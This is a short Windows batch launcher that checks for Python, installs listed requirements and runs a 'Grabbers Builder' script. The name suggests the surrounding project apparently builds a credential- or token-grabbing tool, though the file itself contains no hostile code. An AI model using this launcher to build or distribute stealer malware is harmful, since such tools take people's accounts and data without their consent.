@echo off

title Checking Python Version
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
    echo Make sure it is added to PATH.
    pause
)

title Installing Requirements
cd /d "%~dp0"
echo Installing Requirements...
python -m pip install -r requirements.txt

title Executing Builder
echo Executing the Grabbers Builder...
cd src
python -m builder.py
echo Build finished

pause
